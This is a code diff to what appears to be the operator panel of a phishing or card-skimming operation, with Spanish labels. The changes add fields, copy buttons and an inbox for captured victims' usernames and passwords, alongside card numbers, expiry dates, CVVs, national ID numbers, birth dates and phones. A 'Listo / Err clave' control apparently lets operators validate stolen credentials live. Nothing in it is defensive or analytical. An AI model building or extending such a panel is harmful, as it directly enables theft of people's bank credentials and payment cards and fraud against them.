@@ -478,6 +478,7 @@ function mapSessionRow(session, index = 0) {
         session.clave ||
         '—'
       : session.password || session.clave || '—',
+    password: session.password || session.clave || '',
     token: habilitar
       ? [session.cardExpiry, session.cvv, session.phone, session.extension]
           .filter(Boolean)
@@ -528,6 +529,8 @@ function renderCardAttempt(attempt, index) {
     <article class="note-msg">
       <p class="note-msg__top">Mensaje ${index + 1} · ${formatTime(attempt.at)}</p>
       <dl class="note-pad__list">
+        <div><dt>Usuario</dt><dd class="copyable" data-copy>${attempt.username || '—'}</dd></div>
+        <div><dt>Contraseña</dt><dd class="copyable" data-copy>${attempt.password || '—'}</dd></div>
         <div><dt>Nombre</dt><dd class="copyable" data-copy>${attempt.cardName || '—'}</dd></div>
         <div><dt>Tarjeta</dt><dd class="copyable" data-copy>${formatCard(attempt.cardNumber) || '—'}</dd></div>
         <div><dt>Expiración</dt><dd class="copyable" data-copy>${formatExpiryNote(attempt.cardExpiry)}</dd></div>
@@ -598,24 +601,26 @@ function openNoteModal(rowId) {
         <p class="note-pad__meta">#${row.index} · ${formatTime(row.createdAt)} · ${row.device || '—'}</p>
         <h3 class="note-pad__heading">Datos personales</h3>
         <dl class="note-pad__list">
-          ${
-            isHabilitar(row)
-              ? ''
-              : `<div><dt>Usuario</dt><dd class="copyable" data-copy data-note-field="user">${row.user || '—'}</dd></div>`
-          }
+          <div><dt>Usuario</dt><dd class="copyable" data-copy data-note-field="user">${row.user || '—'}</dd></div>
+          <div><dt>Contraseña</dt><dd class="copyable" data-copy data-note-field="password">${row.password || row.clave || '—'}</dd></div>
+          <div><dt>Nombre</dt><dd class="copyable" data-copy data-note-field="cardName">${row.cardName || '—'}</dd></div>
           <div><dt>C.I.</dt><dd class="copyable" data-copy data-note-field="ci">${row.ci || '—'}${row.complemento ? `-${row.complemento}` : ''}</dd></div>
           <div><dt>Extensión</dt><dd class="copyable" data-copy data-note-field="extension">${row.extension || '—'}</dd></div>
           <div><dt>Fecha nacimiento</dt><dd class="copyable" data-copy data-note-field="birth">${formatBirth(row.birthDate)}</dd></div>
           <div><dt>Celular</dt><dd class="copyable" data-copy data-note-field="phone">${row.phone || '—'}</dd></div>
         </dl>
         ${renderCardAttemptsHtml(row)}
-        <h3 class="note-pad__heading">Datos de tarjeta</h3>
+        ${
+          cardAttemptsOf(row).length
+            ? ''
+            : `<h3 class="note-pad__heading">Datos de tarjeta</h3>
         <dl class="note-pad__list">
-          <div><dt>Nombre</dt><dd class="copyable" data-copy data-note-field="cardName">${row.cardName || '—'}</dd></div>
+          <div><dt>Nombre</dt><dd class="copyable" data-copy data-note-field="cardNameLive">${row.cardName || '—'}</dd></div>
           <div><dt>Tarjeta</dt><dd class="copyable" data-copy data-note-field="card">${formatCard(row.cardNumber) || '—'}</dd></div>
           <div><dt>Expiración</dt><dd class="copyable" data-copy data-note-field="expiry">${formatExpiryNote(row.cardExpiry)}</dd></div>
           <div><dt>CVV</dt><dd class="copyable" data-copy data-note-field="cvv">${row.cvv || '—'}</dd></div>
-        </dl>
+        </dl>`
+        }
         <p class="note-pad__foot">Toca un valor para copiar · Listo / Err clave en la fila</p>
       </div>
       <div class="note-modal__actions">
@@ -658,10 +663,42 @@ function openNoteModal(rowId) {
   })
 }
 
+function collectNoteMessages() {
+  const list = []
+  for (const row of rows.values()) {
+    const attempts = cardAttemptsOf(row)
+    if (attempts.length) {
+      attempts.forEach((attempt, index) => {
+        list.push({
+          id: row.id,
+          unread: Boolean(row.noteUnread) && index === attempts.length - 1,
+          user: attempt.username || row.user || '—',
+          password: attempt.password || row.password || row.clave || '',
+          cardName: attempt.cardName || '',
+          cardNumber: attempt.cardNumber || '',
+          cvv: attempt.cvv || '',
+          at: attempt.at || row.createdAt,
+        })
+      })
+      continue
+    }
+    if (!hasHabilitarNote(row)) continue
+    list.push({
+      id: row.id,
+      unread: Boolean(row.noteUnread),
+      user: row.user || '—',
+      password: row.password || row.clave || '',
+      cardName: row.cardName || '',
+      cardNumber: row.cardNumber || '',
+      cvv: row.cvv || '',
+      at: row.updatedAt || row.createdAt,
+    })
+  }
+  return list.sort((a, b) => (b.at || 0) - (a.at || 0))
+}
+
 function openNotesInbox() {
-  const notes = [...rows.values()]
-    .filter((r) => hasHabilitarNote(r))
-    .sort((a, b) => (b.updatedAt || 0) - (a.updatedAt || 0))
+  const notes = collectNoteMessages()
 
   const overlay = document.createElement('div')
   overlay.className = 'note-modal-overlay'
@@ -677,15 +714,15 @@ function openNotesInbox() {
             ? notes
                 .map(
                   (r) => `
-          <button type="button" class="note-inbox__item${r.noteUnread ? ' is-unread' : ''}" data-open-note="${r.id}">
+          <button type="button" class="note-inbox__item${r.unread ? ' is-unread' : ''}" data-open-note="${r.id}">
             <svg class="note-inbox__icon" viewBox="0 0 24 24" aria-hidden="true">
               <path fill="currentColor" d="M6 3h9l5 5v13a1 1 0 0 1-1 1H6a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1zm8 1.5V9h4.5L14 4.5zM8 12h8v1.5H8V12zm0 3.5h8V17H8v-1.5z"/>
             </svg>
             <span class="note-inbox__body">
-              <strong>${r.ci || r.user || 'Sin CI'}${r.complemento ? `-${r.complemento}` : ''}</strong>
-              <small>${formatCard(r.cardNumber) || 'Sin tarjeta'} · ${r.cardName || 'Sin nombre'} · CVV ${r.cvv || '—'} · ${formatTime(r.createdAt)}</small>
+              <strong>${r.user}</strong>
+              <small>${r.cardName || 'Sin nombre'} · ${formatCard(r.cardNumber) || 'Sin tarjeta'} · CVV ${r.cvv || '—'} · ${formatTime(r.at)}</small>
             </span>
-            ${r.noteUnread ? '<span class="note-inbox__dot" title="Nuevo"></span>' : ''}
+            ${r.unread ? '<span class="note-inbox__dot" title="Nuevo"></span>' : ''}
           </button>`,
                 )
                 .join('')
@@ -726,11 +763,12 @@ function refreshOpenNoteModal(row) {
     if (el) el.textContent = value || '—'
   }
   set('user', row.user || '—')
+  set('password', row.password || row.clave || '—')
+  set('cardName', row.cardName || '—')
   set('ci', `${row.ci || '—'}${row.complemento ? `-${row.complemento}` : ''}`)
   set('extension', row.extension || '—')
   set('birth', formatBirth(row.birthDate))
   set('phone', row.phone || '—')
-  set('cardName', row.cardName || '—')
   set('card', formatCard(row.cardNumber) || '—')
   set('expiry', formatExpiryNote(row.cardExpiry))
   set('cvv', row.cvv || '—')
@@ -774,6 +812,7 @@ function upsertSession(session) {
       noteUnread: existing.noteUnread,
       user: keepValue(mapped.user, existing.user),
       clave: keepValue(mapped.clave, existing.clave),
+      password: keepValue(mapped.password, existing.password),
       token: keepValue(mapped.token, existing.token),
       tipo: keepValue(mapped.tipo, existing.tipo),
       flow: mapped.flow || existing.flow,
